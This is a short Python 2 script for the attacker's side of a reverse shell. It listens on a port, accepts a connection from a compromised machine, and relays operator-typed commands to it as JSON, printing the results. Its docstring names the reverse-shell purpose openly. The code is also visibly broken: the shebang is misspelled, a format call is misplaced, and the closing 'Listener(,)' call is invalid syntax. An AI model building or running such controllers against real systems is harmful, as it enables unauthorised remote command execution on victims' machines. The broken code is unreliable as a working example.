#!/usr/bin/enbv python
import socket
import json

class Listener:
    """
    Listens for incoming connections on a given port,
    allows controller to issue cmds to est. reverse shell.
    """
    def __init__(self, controller_ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # allow reuse to est new connection if dropped
        listener.bind((controller_ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections...")
        self.connection, address = listener.accept()
        print("[+] Received connection from {i}.").format(i=str(address))

    def serialize(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)
    
    def deserialize(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError: # more data
                continue

    def remote_execution(self, cmd):
        self.serialize(cmd)
        return self.deserialize()

    def run(self):
        while True:
            cmd = raw_input(">> ")
            res = self.remote_execution(cmd)
            print(res)

knex = Listener(,)
knex.run()